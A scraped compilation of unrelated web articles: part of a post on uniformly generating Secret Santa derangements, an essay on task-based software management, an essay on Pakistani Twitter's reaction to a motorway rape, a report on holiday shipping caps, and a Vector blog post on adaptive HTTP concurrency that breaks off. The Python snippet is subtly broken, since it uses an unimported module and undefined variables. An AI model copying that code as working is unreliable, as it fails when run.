<p>If you do a similar calculation for the probability that <code>backtracker()</code> would produce \((2, 3, 5, 4, 0, 1)\) you should get \(\frac{1}{360}.\)
Not only are the probabilities for generating those two derangements significantly different from each other but they also both differ from the expected probability of \(\frac{1}{265}\) if every one of the \(D_6\) derangements had an equal probability of being generated.
I generated 10,000 derangements of length 6 with <code>backtracker()</code>, and sure enough \((5, 0, 1, 2, 3, 4)\) was generated 94 times while \((2, 3, 5, 4, 0, 1)\) was generated only 20 times.
The graph below shows a plot of counts for every 6-derangement over the 10,000 runs:</p>
<div>
<p><img src="https://catswhisker.xyz/log/2020/12/7/deranged_sinterklaas/generate_backtrack.png" alt="A bar chart showing the frequency of each derangement produced in 10,000 trials. The backtracker algorithm is clearly not choosing derangements uniformly.">
</p>
<p>Figure 2. Count of each derangement produced after running backtracker() 10,000 times with \(n = 6\). It is clearly not choosing derangements uniformly. The grey line shows the expected count if each derangement were generated with uniform probability (\(1/D_6\cdot 10000 \approx 37.7\))</p>
</div>
<p>Instead of building derangements by randomly selecting elements and checking if the result is a derangement, we could simply generate all possible permutations, filter out the non-derangements, and then randomly select one of the derangements to return.
The nice thing about that approach is that we could enforce any other constraints we want in the filter step (maybe we want a minimum cycle length or have a “blacklist” of people who should not be assigned to each other) and we can still be confident we would select a valid secret santa assignment with uniform probability (since we have generated all of them it is easy to select one at random).</p>
<div>
<p>generate_all()</p>
<div>
<pre><code data-lang="python"><span>import</span> <span>random</span>
<span>def</span> <span>generate_all</span>(n):
    potential = []
    perms = itertools.permutations(<span>range</span>(n))
    <span>for</span> p <span>in</span> perms:
        <span>if</span> check_constraints(p, m, bl):
            potential.append(p)
    <span>return</span> random.choice(potential)</code></pre>
</div>
</div>
<p>Below you can see a bar graph of the counts after producing 10,000 derangements of length 6 with <code>generate_all()</code>.
It <em>looks</em> much more uniform than <code>backtracker()</code> at least.
One tool we can use to gauge how closely our counts match what we should expect from a uniform distribution is the <a href="https://en.wikipedia.org/wiki/Chi-squared_test">chi-squared statistic</a>:</p>
<div>
<p>
\[\begin{equation*}
  \chi^2 = \sum\frac{(O_i - E_i)^2}{E_i}
\end{equation*}\]
</p>
</div>
<p>where \(O_i\) are our observed counts and \(E_i\) are the expected counts for each derangement (which in our case is \(1/D_6\cdot 10000 \approx 37.7\)).
For my data I calculated \(\chi^2 \approx 261.75\).
If we check that against the chi-squared cumulative distribution function with k-1 degrees of freedom (where k is the number of data points, 265 in this case), we get a p-value of about 0.53.
The p-value is the probability that our \(\chi^2\) value would be least 261.75 if our counts were uniformly distributed.
Usually if p&lt;0.05 it would be prudent to question whether the data fits a uniform distribution.
On the other hand if p&gt;0.99 or so we could be …</p></div></div></div>

    <h2>{<br>&nbsp;&nbsp;&nbsp;&nbsp;Adam Ard<br>}</h2><br>
  <h2>Little Tasks, Little Trust</h2>
  <h3>How Delegating Responsibilities is Better Than Managing By Tasks</h3>
  <blockquote>
    Trust is the highest form of motivation. It brings out the very
    best in people.
  </blockquote>
  <blockquote>
    --Stephen R. Covey, The 7 Habits of Highly Effective People
  </blockquote>
  <p>
It’s basically a sacred project management mantra by
now: <strong>divide your work into tasks that are as small as
possible</strong>. Estimate them with your team. Then drop them into
the all-knowing product backlog. But no one seems to be looking very
critically at how this practice has affected the software engineering
profession. Back in the 90’s, when I started programming, this was not
how it worked. It was, dare I say, a little more
professional.</p><p>Back then, your boss had a dozen or more things
they were responsible for and when you got hired they breathed a deep
sigh of relief.</p><p>“Finally, now that Vincent is here, I can make
him do A and B; and with Ted doing C, D, and E and Jan doing F, G, and
H, I can finally get to I, J, K, L, and M.”</p><p>Most importantly, A
and B were big things, like whole products or large system
libraries. Building and maintaining them consumed all of your
time. They were your delegated responsibilities, not mere tasks. It
wasn’t that hard to manage people this way either. If you weren’t
doing a good job, the boss would let you know.</p><p>“Hey, Vincent, A
isn’t turning out quite like I was imagining. Can you do a little more
of this — and definitely more cowbell.”</p><p>Then you went back to
your private office (I sure miss private offices, but that is a topic
for another day) and fixed a few things. Later, in a weekly status
meeting you would tell people how it went — yep, that’s right, no
daily stand-ups where you look mournfully at your shoes and admit that
you didn’t make any notable progress yet.</p><p>No backlog grooming
meetings or burn-down charts either. Your manager simply looked at
how <em>your </em>products were coming along. A little trust, some
accountability, and a healthy portion of “give me some space to do my
work.”</p><p>The way we work now is different. Sadly, it’s less
motivating, less efficient, and profoundly less respectful of
individual abilities.</p><h3>whose vision is it again?</h3><p>As I
see it, little tasks are born of a fundamentally different management
attitude. Small tasks are a not-so-subtle way of saying that all the
product vision lies with management. Keep away. Don’t
touch.</p><p>While larger tasks send a completely different
message. Here, management is giving you bigger pieces to chew on,
inviting you to mix some of your own creativity with the end
product. You get to do some design work, think about what the customer
needs, and take pride in what comes out the other end. Sure, the
organization has an overarching strategy, but they still want people
to take on responsibilities, not just errands. They trust you to align
with the overall vision and because you feel like you are part of the
“club”, you actually want to.</p><h3>too much love for the
metrics</h3><p>Small tasks have also taken hold because they fit
nicely with the age-old assembly-line mentality. Sadly, there are
armies of managers that still live by that dogma. For them, it is all
about picking <em>metrics and optimizing them </em>— management by
chart and graph.</p><p>Unfortunately, little tasks in Jira (or any of
the dozens of other issue tracking systems out there) bring the
promise of a whole host of tasty new charts and graphs: burn-down,
burn-up, velocity, lead-time, cycle time, task age, throughput, failed
deployment, flow and control. It’s as irresistible as candy to a
baby.</p><p>But, assigning responsibilities instead of tasks takes
away an assembly-line manager’s favorite tools. Because they are
larger, responsibilities can’t be so easily measured and tracked. So
metrics-managers will fight both tooth and nail to keep your work divided
and cataloged in tiny, traceable instructions.</p><h3>when will I get some design
experience?</h3><p>Sadly, as developers, we do it to ourselves as
well. Once someone gives us a better title, we are right on board with
the program. When a regular developer might have had a chance to do
some research or design, we immediately snatch it away for
ourselves.</p><p>As technical management, we standardize our
frameworks, languages, deployment operating systems, and cloud service
providers. We write wrappers around networking, logging, and
monitoring libraries and demand they always be used. Then, after we
have taken the task of designing and researching the CI/CD tools and
pipeline, we write coding standards for our coding
standards.</p><p>Worse yet, we design every product’s architecture,
and expect any deviation to be approved by us first. All that is left
are tiny morsels. Grunt work for the foot soldiers once the fun has
been stripped away.</p><p>Poor front-line programmers are left
wide-eyed with empty bowls, asking “please sir, can I have some more?
I just wanted to design one little service. I know I am not worthy,
but can I please just write my own sql queries without using that
awful ORM?  PLEASE?”</p><p>Sadly, when those poor programmers finally
seek promotion, hoping for their first real shot at higher level
engagement, they are rebuffed: “You don’t really have any design
experience I am afraid. We are looking for someone who has designed
large systems.”</p><p>To their managers they could rightfully reply,
“that was your doing, not mine!”</p><h3>estimation is never
free</h3><p>There is a grave misconception circulating that if you
just sit down, in a comfy conference room chair, and split a project
into tiny tasks, small enough to be individually estimated,
then when you add them up, Viola! You’ll have a accurate
estimate for the whole project! Easy peasy.</p><p>There are two
problems with this delusion. First, no task, even a small one,
is easy to estimate. I have seen many “tiny”, one-day tasks blow up
into week long campaigns. All because of hidden complexity that comes
popping out like a Pandora’s box once you start coding on
it.</p><p>Second, when you divide work into little tasks, before
actually working on any of them, you are making untested
assumptions. Many of them. The more tasks you define, the more facets
of a hypothetical design you must assume (implicitly of course, since
no one ever writes design assumptions in task descriptions). Soon,
you’ve created a long chain of design choices, all depending on
previous ones, sitting on sticky notes on the wall.</p><p>The problem
is, as soon as you start working on one of them, you will
realize that your implicit design decisions are wrong. Now, you will spend MUCH more time than was
previously estimated for this task and all other tasks that depend on
its faulty design are invalid. The whole house of cards comes
tumbling down. Time for another all-day backlog grooming session? What
a waste!</p><h3>conclusion</h3><p>Back in the day, before everyone
realized that software companies were positioned to make lots of
money, we had some elbow room. We had a lot of responsibility and the
ability to make a lot of decisions. But now, a lot more people have
piled onto the island. Unfortunately, some of them have slowly chipped
away at the domain of the software engineer. One by one, descending
from their vessels they planted their flags:</p><p>“I am Amerigo, the
product guy. Heretofore, no developer will make product decisions, for
they are mine.”</p><p>“And I am Ferdinand, process guy. Heretofore,
no developer will make process decisions, for they are
mine.”</p><p>“I Bartolomeu will enforce compliance.”</p><p>“I Vasco
used to be pretty good at Microsoft Access, I guess I’ll be the
database guy.”</p><p>One by one, until every responsibility that
wasn’t actual open-up-emacs-and-start-typing-stuff programming was
taken away, forbidden even. And then, the remaining, purely technical
tasks were carved up by architecture/standard hoarding engineers,
hungry for something of substance. Only dry, broken carcasses were
left scattered on the ground.</p><p>Of course, there is a solution to
this predicament — delegate <em>responsibilities</em> to everyone,
all the way down to the bottom of the hierarchy. Or better yet,
flatten or abolish the hierarchy all together. But until that
happens, you’ll just have to content yourself with measly for-loops
and if-statements — following the coding standard of
course.</p></div></div>]]>

<p><span>F</span>eel-good moments are difficult to come by on Twitter in Pakistan. In between the political infighting and trolls, though, there was a brief moment where the ugliness the platform often brings out in people gave way to the app’s potential for humanity.&nbsp;</p>



<p>In October, a Karachi school teacher, Aimun Faisal, tweeted questions from her students about space and space travel. “Do you get scared that your space shuttle might get lost?” one 10-year-old asked. Ms. Faisal tagged NASA and other space agencies in the post, encouraging readers to retweet it and bring it to their attention. <a href="https://gulfnews.com/world/asia/pakistan/nasa-astronauts-scientists-answer-pakistani-fourth-graders-science-questions-on-twitter-1.1602755591289">It worked</a>.</p>



<p>A Canadian astronaut who has flown in a space shuttle twice replied that he wasn’t scared because Earth was nearby, and he could use the stars to find his way. “I felt especially comforted when I flew over home,” <a href="https://twitter.com/Cmdr_Hadfield/status/1316390465277767682?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1316390465277767682%7Ctwgr%5E%7Ctwcon%5Es1_&amp;ref_url=https%3A%2F%2Fgulfnews.com%2Fworld%2Fasia%2Fpakistan%2Fnasa-astronauts-scientists-answer-pakistani-fourth-graders-science-questions-on-twitter-1.1602755591289">he tweeted</a>. “Here’s a photo I took of Karachi — can you find your school?”</p>



<p>It’s the kind of interaction that leads one to believe that perhaps all you need in life is a Twitter account and a heart that still beats. The media ate it up too: Ms. Faisal and her tweet were in all the major newspapers and even on TV. We were gushy over Ms. Faisal; we wished there were more teachers like her.&nbsp;</p>



<p>Just a few weeks later, people were suggesting that Ms. Faisal should go jump into a river or move to another country.&nbsp;</p>



<p>It all turned after — what else? — a series of tweets.&nbsp;</p>



<p>One evening this past September, a woman set out in her car on a motorway outside Lahore, her two children in tow. Motorways in Pakistan are safer than most roads there; they have their own police, who have a reputation, unlike other police units, for being well-dressed and resistant to corruption.&nbsp;</p>



<p>That evening, the woman’s car ran out of fuel. She locked her car doors and made some phone calls, but the rescue service didn’t answer, and she couldn’t get through to her family. By now, it was past midnight. She made more calls and waited for a friend to come pick her up. While she waited, two men emerged from the darkness, broke her car window, and when she fought back, took her children into some nearby bushes. She scrambled to save them, and while she fought, she was gang-raped.&nbsp;</p>



<p>In the pre–social media age, if a rape story ever got more than a couple of column inches on the inside pages of a newspaper, the victim not only had asked for it but, by reporting it and making it public, was asking for something more.&nbsp;</p>



<p>In an interview with the <em>Washington Post</em>, Pakistan’s former president and army chief Pervez Musharraf (now absconded from the country) once said <a href="https://www.washingtonpost.com/archive/politics/2005/09/19/musharraf-denies-rape-comments/5f2e0d4c-5ff2-4273-81e5-878cd59a1744/">Pakistani women get themselves raped so they can get a Canadian visa</a>. He probably thought he was being funny or insightful. When his office denied his having said it, the <em>Post</em> made the audio public. You can hear one of his aides laughing in the background.&nbsp;</p>



<p>Attitudes toward rape haven’t changed much since the Musharraf days, but there was something about the awfulness of a woman trapped with her children on a motorway at night that struck a chord with the Pakistani public. As the news rippled through Twitter, #LahoreMotorwayIncident became a trending hashtag. The details of the crime were so grotesque that, for a few days, it <a href="https://www.bbc.com/news/world-asia-54186609">seemed the nation actually believed that rape was a crime</a> and that the woman hadn’t asked for it.&nbsp;</p>



<p>Pakistan’s traditional and social media go into this kind of outrage cycle when children get raped, or get raped and then killed, which happens more often than one can stomach. There was genuine fury across the country when a 7-year-old girl was raped, strangled, and left in a rubbish heap two years ago. <a href="https://www.dawn.com/news/1439587">Her name was Zainab</a>. On Twitter and Facebook, users argued over whether her rapist and killer should be hanged in public, quartered, doused in acid, or just locked up for life.</p>



<p>After the motorway incident, the usual bloodlust was on display. There were calls for public hangings and for chopping up the culprits. Prime Minister Imran Khan even appeared on a TV interview saying <a href="https://www.cnn.com/2020/09/16/asia/imran-khan-chemical-castration-rapists-intl/index.html">he has been contemplating chemical castration as a punishment for such crimes</a>.</p>

<p>And while the Lahore rapists were still on the loose, the newly appointed Lahore police chief appeared on one of the nightly news shows during the wall-to-wall media coverage. In effect, he said he was surprised that a mother of two had decided to take the motorway when another road would have sufficed for her journey. And if she had to take the motorway, he went on to ask, couldn’t she at least have checked her gas tank?&nbsp;</p>



<p>Ms. Faisal, the teacher we had fawned over just weeks prior for her tweets about space travel, was outraged. On Twitter, she was one of many to demand the police chief’s resignation, tweeting in disgust at the craven responses to the news she and others were seeing, rhetorical questions as to why the woman had failed to prevent her own assault.&nbsp;</p>



<p>In return, our beloved Ms. Faisal was met with a flood of insults; trolls suggested she leave Pakistan if she had a problem with it. Being stuck on the motorway without gas became an internet meme that small-time politicians and social media trolls lobbed at one another. Somewhere along the way, “Why didn’t she check her petrol tank before leaving her home?” replaced the original question: “What kind of beasts would rape a woman in front of her children?”&nbsp;</p>



<p>How did this horror morph into a meme? Does every one of us carry inside us a bit of General Musharraf, smirking while his aides giggle?&nbsp;</p>



<p>Long before we had social media, Pakistan swam through its sea of miseries on the backs of jokes. The mausoleum of Pakistan’s longest-serving dictator, General Zia’ul Haq, is jokingly referred to as Jaws Square. Guess why? Because, after ruling over us for 11 years, he died in a plane crash, and only his teeth survived.&nbsp;</p>



<p>Jokes back then went viral before we ever began to call them “viral.” You would hear one about the dictator in Urdu in Karachi one day, and the next day in Peshawar, someone would tell you it in Pashto. Jokes eased us out of our terror.&nbsp;</p>



<p>But now the jokes themselves have become the terror. You can make a joke about a dead dictator, or Osama bin Laden becoming fish food, but how do you laugh at a joke about a woman raped in front of her children on the side of the motorway in the dead of night? Jokes were meant to subvert the powerful, not kick the poor to the ground.&nbsp;</p>



<p>For a brief moment, social media in Pakistan made it easy to laugh at despots and oppressors. They answered with troll farms, indoctrinating the youth to be subservient to power. Even in the midst of incidents so nauseating that they capture the attention of our fractured social media, the horrors of which seem undeniable, the trolls find ways to mock and belittle.&nbsp;</p>



<p>In November, another shocking piece of news roiled Pakistan’s social media: A 4-year-old rape survivor told her gut-wrenching story in a video that went viral. It was so harrowing, I couldn’t bring myself to watch it, even for reporting purposes. In another video, also shared widely online, the doctor who treated her after the assault broke down crying.&nbsp;</p>



<p>On Twitter, it’s easy to find redemption in the narrative too. In the middle of the outrage cycle, social media made a hero of the policeman <a href="https://www.gulftoday.ae/news/2020/11/14/pakistani-policeman-uses-own-daughter-as-bait-to-nab-rapists">who had found the girl’s rapist by enlisting his own daughter to lure him</a>. The rapist was killed in a police encounter.&nbsp;</p>



<p>The policeman and his underage daughter were forced to take this extreme step because there were no women officers in his district. The prime minister called to congratulate the man, and his daughter was awarded a million rupees as a prize along with a guaranteed college scholarship.&nbsp;</p>



<p>Ms. Faisal, who by now has endured a litany of abuses online, questioned the collective satisfaction on social media. As proud as we are of the police officer, she tweeted, the story said more about the country’s broken system than it did about heroism. “No police officer should be forced to risk his family to perform his duty,”<a href="https://twitter.com/bluemagicboxes/status/1327209635594588165"> she wrote</a>.</p>



<p>“Tum kabhi khush na hona,” someone tweeted back. “You’ll never be happy.”</p>

December 8, 2020 | https://www.modernretail.co/retailers/this-is-going-to-ruin-us-fedex-and-ups-hit-companies-with-unexpected-holiday-shipping-limits/ | <a href="https://web.archive.org/web/*/https://www.modernretail.co/retailers/this-is-going-to-ruin-us-fedex-and-ups-hit-companies-with-unexpected-holiday-shipping-limits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Johnny Galbraith, co-founder of Salt Lake City-based e-commerce company Letterfolk, knew that it was going to be difficult to get orders to customers in a timely manner this holiday season, with more people ordering online than ever before.</p><p>He thought he had come up with a solution: to hold his Black Friday sale a week earlier this year. That way, he would be shipping out his products before carriers like FedEx — which he estimates ships 75% of Letterfolk’s packages — would be under the most strain.</p><div id="piano-cta">
<p>But on the Saturday before Thanksgiving, Galbraith got a call from his FedEx representative: through the holidays, FedEx would only pick up 110 Letterfolk packages per day — something that has never happened to Galbraith in the five years he’s been in business. It was a number that was calculated based on the average number of packages FedEx was picking up from Letterfolk per day in September, plus 10%. But thanks to his early Black Friday sale, Galbraith had a queue of 3,000 orders waiting to go out.</p>

<p>“It was like, ‘this is going to ruin us as a business,'” said Galbraith, whose company sells letterboards and other home decor. “We are being told that just to ship out our existing queue — without any other orders coming it — it would take us up until the holidays to get them out to customers.”</p>
<p>Carriers like FedEx and UPS have been warning for months to <a href="https://www.wsj.com/articles/this-holiday-crunch-starts-early-with-more-packages-than-means-to-deliver-them-11603013401">expect holiday shipping delays</a>. But some retail executives, like Galbraith, say they were not given advanced notice by carriers that they could face package pickup limits this holiday. It’s an issue that’s affecting companies both big and small — the Wall Street Journal <a href="https://www.wsj.com/articles/ups-slaps-shipping-limits-on-gap-nike-to-manage-e-commerce-surge-11606926669">reported</a> last week that UPS had temporarily stopped accepting shipments from major retailers like Nike and Macy’s.</p>
<p>Some executives who spoke with Modern Retail said that they feel like their carriers did not give them enough advance notice before applying a limit, and are frustrated by the fact that limits seem to be arbitrarily applied. In the meantime, they’re scrambling to find often expensive alternatives, including renting their own trucks or trying to find space with other carriers.</p>
<p>Representatives from FedEx and UPS would not provide details to Modern Retail about how they calculate package pickup limits.</p>
<p>FedEx has been “proactively working with our customers to understand their expected volume,” a spokeswoman told Modern Retail, and said the company has been preparing for the holidays by hiring more than 70,000 seasonal workers this year, and for the first time, picking up packages seven days a week.</p>

<p>“<span>UPS</span>&nbsp;continues to work closely with our largest customers to steer volume to capacity and ensure the&nbsp;<span>UPS</span> network is reliable for all customers,” a UPS spokesman said. “Agreed upon strategies for our largest customers include shifting package volume away from the heaviest demand shipping days, fully utilizing weekend capacity, and aligning promotional strategies with capacity.”</p>
<p><strong>Making their own deliveries<br>
</strong>For the most part, UPS and FedEx first started imposing shipping limits after Black Friday. Helena Price Hambrecht, founder of aperitif brand Haus, <a href="https://www.nytimes.com/2020/12/05/business/ecommerce-shipping-holiday-season.html?referringSource=articleShare">told the New York Times</a> that FedEx informed her that starting on Wednesday, its drivers would only pick up 500 packages from Haus per week day, through the holidays. FedEx however, did give Haus a larger cap on the weekends. In a follow-up email to Modern Retail, Price Hambrecht did not say exactly when FedEx informed her of the limit, only that “FedEx has been great about communicating changes to us as soon as possible.”</p>
<p>David Malka, chief sales officer of returns processing company goTRG — which works with major retailers like Target, Walmart and Lowe’s to process some of their returns — told Modern Retail that shipping limits of roughly 200 packages per day had been imposed at four of the company’s warehouses. Though he added that the company is getting “conflicting reports” from FedEx about what exactly the limit is at some facilities. Malka, like Gilbraith said that goTRG received no advanced notice from FedEx that package pickup limits would be applied.</p>
<p>The most immediate way that retailers are trying to deal with pickup limits imposed by UPS or FedEx is to redirect some shipments to another carrier. Shortly after Galbraith’s FedEx representative informed him of Letterfolk’s new limit, he immediately set up deliveries through UPS — something he said he hadn’t done previously because he had a good relationship with FedEx.</p>
<p>That’s helped Letterfolk get through some of the 3,000 order backlog, though its <a href="https://www.letterfolk.com/pages/holiday-shipping-info">website is still advising customer</a>s that most orders placed during its Black Friday sale will ship within one to three business weeks. However, he said that it’s more expensive right now for Letterfolk to ship through UPS, because his company didn’t have time to negotiate discounted rates.</p>
<p>Some companies are setting up other contingency plans to ensure their packages get into customers hands more quickly. Price Hambrecht told Modern Retail that Haus will be relying on Ohi, a last-mile delivery provider, to deliver more of its packages in the Bay Area and Southern California.</p>
<p>Jay Sauceda, founder of Austin-based 3PL Sauceda Industries, said that his company rented its own truck for the first time for the holidays. Sauceda — which works with companies including apparel brand Rowing Blazers and bra startup Pepper — has yet to be hit with a package pickup per day limit. But if it does, the plan then is to load packages onto the truck and deliver them directly to a FedEx or UPS sorting facility.</p>
<p>Sauceda is also advising its customers to try and encourage customers to get orders in two to three days ahead of shipping cutoffs given by FedEx, UPS and other carriers to ensure packages arrive in time for Christmas and other key dates.</p>
<p>“[The carriers] are in a very unenviable position,” Sauceda said. “So the biggest thing that we are trying to do this year to try to take the tension off.”</p>
<p><em>This story has been updated to clarify that FedEx has capped the number of Haus packages it will pick up at 500 per week day, not per day as previously stated.&nbsp;</em></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Observability pipelines have become critical infrastructure in the current technological landscape, which is why we've built <a href="https://vector.dev/">Vector</a> to provide extremely high throughput with the tiniest resource footprint we can manage (<a href="https://rust-lang.org/">Rust</a> is a huge help here). But this is not enough in the real world: your observability pipeline needs to provide optimal performance and efficiency while <em>also</em> being a good infrastructure citizen and playing nicely with services like <a href="https://vector.dev/docs/reference/sinks/elasticsearch">Elasticsearch</a> and <a href="https://vector.dev/docs/reference/sinks/clickhouse">Clickhouse</a>.</p><p>And so we're excited to announce that Vector version 0.11 includes support for <strong>Adaptive Request Concurrency</strong> (ARC) in all of its HTTP-based <a href="https://vector.dev/docs/reference/sinks">sinks</a>. This feature does away with static rate limits and automatically optimizes HTTP concurrency limits based on downstream service responses. The underlying <a href="#how-it-works">mechanism</a> is a feedback loop inspired by TCP congestion control algorithms.</p><h2>The lead-up</h2><p>One of the most common support questions we get about Vector involves logs like this:</p><div><div><pre><div><p><span>TRACE tower_limit::rate::service: rate limit exceeded, disabling service</span></p></div></pre></div></div><p>Users typically have two questions about this:</p><ol><li>What does it mean?</li><li>How can I fix it?</li></ol><p>The answer to the first question is simple: Vector has <em>internally</em> rate-limited processing to respect user-configured limits—<a href="https://vector.dev/docs/reference/sinks/http/#rate_limit_duration_secs"><code>request.rate_limit_duration_secs</code></a>, <a href="https://vector.dev/docs/reference/sinks/http/#rate_limit_num"><code>request.rate_limit_num</code></a>, and <a href="https://vector.dev/docs/reference/sinks/http/#in_flight_limit"><code>request.in_flight_limit</code></a>—for that particular <a href="https://vector.dev/docs/reference/sinks">sink</a>. In other words, Vector has intentionally reduced performance to stay within static limits.</p><p>The answer to the second question—how to fix it—is more complex because it depends on a variety of factors that change over time (covered in more detail <a href="#the-second-problem-rate-limiting-is-not-a-panacea">below</a>). Telling the user to raise their limits would be irresponsible since we'd then risk overwhelming the downstream service and causing an outage; but not changing them could mean limiting performance in a dramatic way.</p><blockquote><p>"In one case, we found that rate limits were limiting performance by over 80%."</p></blockquote><p>The crux of the matter is that Vector's high throughput presents a major challenge for HTTP-based sinks like <a href="https://vector.dev/docs/reference/sinks/elasticsearch">Elasticsearch</a> because those services can't always handle event payloads as quickly as Vector can send them. And when data services are heavily interdependent—which is almost always!—letting Vector overhwelm one of them can lead to system-wide performance degradation or even cascading failures.</p><p>In versions of Vector prior to 0.11, you could address this problem by setting <a href="https://vector.dev/docs/reference/sinks/http/#rate-limits"><strong>rate limits</strong></a> on outbound HTTP traffic to downstream services. Rate limiting certainly <em>does</em> help prevent certain worst-case scenarios but customer feedback and our own internal QA has revealed that this approach also has deep limitations.</p><h2>The problem: rate limiting is not a panacea</h2><p>Rate limiting is nice to have as a fallback but it's a blunt instrument, a static half-solution to a dynamic problem. The core problem is that configuring your own rate limits locks you into a perpetual loop:</p><p><img src="https://vector.dev/img/rate-limiting-loop.png" alt="The rate limiting decision loop"></p><p>Within this vicious loop, you need to constantly avoid two outcomes:</p><ul><li>You set the limit too high and thus <strong>compromise system reliability</strong> by overwhelming your services. Time to lower the limit and re-assess.</li><li>You set the limit too low and <strong>waste resources</strong>. Your Elasticsearch cluster may be capable of handling more concurrency than you're providing—at least for now. Time to raise the limit and re-assess.</li></ul><p>Not only do you need to perform this balancing act on a per-sink basis and on each Vector instance—that may be a <em>lot</em> of application points in your system—but the optimal rate is an elusive target that shifts along with changes in a number of factors:</p><ul><li>The number of Vector instances currently sending traffic</li><li>The current capacity of downstream services</li><li>The volume of data you're currently sending</li></ul><p>These changes are especially pronounced in highly elastic environments, like <a href="https://kubernetes.io/">Kubernetes</a>, that are essentially <em>designed</em> to let you tweak cluster topologies, configuration, and much more with very little friction, which compounds the problem.</p><p>And don't forget, of course, that this chasing-the-dragon decision loop has its own cognitive and operational costs.</p><h2>The solution: Adaptive Request Concurrency</h2><p>We feel strongly that Vector's <strong>Adaptive Request Concurrency</strong> (ARC) feature provides a qualitatively better path than rate limiting. With ARC <a href="#the-role-of-configuration">enabled</a> on any given sink, Vector determines the optimal network concurrency based on current environment conditions and continuously re-adjusts in light of new information.</p><p>Here's how that plays out in some example scenarios:</p><table><thead><tr><th>Change</th><th></th><th>Response</th></tr></thead><tbody><tr><td><strong><em>You deploy more Vector instances</em></strong></td><td>➔</td><td>Vector automatically redistributes HTTP throughput across both current and new instances</td></tr><tr><td><strong><em>You scale up your Elasticsearch cluster</em></strong></td><td>➔</td><td>Vector automatically increases concurrency to take full advantage of the new capacity</td></tr><tr><td><strong><em>You scale your Elasticsearch cluster back down</em></strong></td><td>➔</td><td>Vector lowers concurrency to avoid any risk of destabilizing the cluster (while still taking full of advantage of the now-decreased bandwidth)</td></tr><tr><td><strong><em>Your Elasticsearch cluster experiences a temporary outage</em></strong></td><td>➔</td><td>Vector lowers concurrency dramatically and provides backpressure by <a href="https://vector.dev/docs/reference/sinks/http/#buffer">buffering</a> events</td></tr></tbody></table><p>With ARC, these scenarios require no human intervention. Vector quietly hums along making these decisions for you with a speed and granularity that rate limits simply cannot provide.</p><h2>How it works</h2><p>ARC in Vector is based on a decision-making process that’s fairly simple at a high level. When Vector POSTs data to downstream services via HTTP, it continuously keeps track of downstream service performance and uses that information to make precise concurrency decisions.</p><p>The diagram below shows Vector's decision chart:</p><p><img src="https://vector.dev/img/adaptive-concurrency.png" alt="The Adaptive Request Concurrency decision chart"></p><p>With ARC enabled, Vector watches for significant movements in two things: the round-trip time (RTT) of requests and HTTP response codes (failure vs. success).</p><ul><li>If the RTT is declining/constant and/or response codes are consistently successful (200-299), Vector sees 🟢 and increases the throughput linearly. This is the "additive increase" in AIMD.</li><li>If the RTT is increasing and/or response codes consistently indicate failure—codes like <code>429 Too Many Requests</code> and <code>503 Service Unavailable</code>—Vector sees 🟡 and exponentially decreases concurrency. This is the "multiplicative decrease" in AIMD.</li></ul><p>This decision tree is always active and Vector always "knows" what to do, even in extreme cases like total service failure.</p><h3>The role of configuration</h3><p>Vector never stops quietly making the linear up vs. exponential down decision in the background, and it works out of the box with zero configuration beyond enabling the feature, which is currently on an opt-in basis in version 0.11. You can enable ARC in an HTTP sink by setting the <a href="https://vector.dev/blog/adaptive-request-concurrency/request_concurrency"><code>request.concurrency</code></a> parameter to <code>adaptive</code>. Here's an example for a Clickhouse sink:</p><div><div><pre><div><p><span>[</span><span>sinks.clickhouse_internal</span><span>]</span><span></span></p><p><span></span><span>type</span><span> </span><span>=</span><span> </span><span>"clickhouse"</span><span></span></p><p><span></span><span>inputs</span><span> </span><span>=</span><span> </span><span>[</span><span>"log_stream_1"</span><span>,</span><span> </span><span>"log_stream_2"</span><span>]</span><span></span></p><p><span></span><span>host</span><span> </span><span>=</span><span> </span><span>"http://clickhouse-prod:8123"</span><span></span></p><p><span></span><span>table</span><span> </span><span>=</span><span> </span><span>"prod-log-data"</span><span></span></p><p><span></span><span>request.concurrency</span><span> </span><span>=</span><span> </span><span>"adaptive"</span></p></div></pre></div></div><p>There's also room for fine-tuning if you find yourself needing additional knobs:</p><ul><li><strong>Buffering</strong>. What happens when Vector needs to lower concurrency and thus throttle the output? What happens to data that needs to be sent later? Vector lets you choose between an on-disk and an in-memory <a href="https://vector.dev/docs/reference/sinks/http/#buffer">buffer</a> and to set a <a href="https://vector.dev/docs/reference/sinks/http/#max_size">max_size</a> for that buffer. The <code>memory</code> buffer is the default, which maximizes performance, but you can always choose <code>disk</code> if your use case requires stronger durability guarantees. As always, this can be configured on a per-sink basis.</li><li><strong>The adaptive concurrency algorithm itself</strong>. In general, you shouldn't need to adjust the algorithm, but in case you need to resort to that, there are three parameters available:<ul><li><code>decrease_ratio</code> — This determines how rapidly Vector lowers the limit in response to failures or higher latency.</li><li><code>ewma_alpha</code> — Vector uses an exponentially weighted moving average (EWMA) of past RTT measurements as a reference to compare with the current RTT. The <code>ewma_alpha</code> parameter determines how heavily new measurements are weighted compared to older ones.</li><li><code>rtt_threshold_ratio</code> — The minimal change in RTT necessary for the algorithm to respond and adjust concurrency; changes below that threshold are ignored.</li></ul></li></ul><p>The defaults should work just fine for these parameters in most cases, but we know that some scenarios may call for a highly targeted approach.</p><h2>How we built it</h2><p>The development process behind ARC was highly methodical and data-driven. To summarize:</p><ul><li>Customer feedback has pinpointed concurrency management as a pain point since very early in the life of Vector.</li><li>The initial foray in addressing the problem came in <a href="https://github.com/timberio/vector/blob/master/rfcs/2020-04-06-1858-automatically-adjust-request-limits.md">RFC 1858</a>, which called for a qualitatively better option for users and <a href="https://github.com/timberio/vector/blob/master/rfcs/2020-04-06-1858-automatically-adjust-request-limits.md#prior-art">gestured toward</a> some possible inspirations.</li><li>Our engineers ultimately opted for a solution deeply inspired by analogous work on the Netflix engineering team, which is beautifully summarized in the <a href="https://medium.com/@NetflixTechBlog/performance-under-load-3e6fa9a60581">Performance Under Load</a> piece on their blog. Our respective approaches utilize an <a href="https://en.wikipedia.org/wiki/Additive_increase/multiplicative_decrease">additive-increase/multiplicative-decrease</a> (AIMD) algorithm inspired by TCP <a href="https://en.wikipedia.org/wiki/TCP_congestion_control">congestion control</a> algorithms. We'll have a lot more to say about this here on the blog next week. If you want to see the in-depth discussion that drove this process, see GitHub <a href="https://github.com/timberio/vector/issues/3255">issue #3255</a> on the Vector repo. There you'll see a 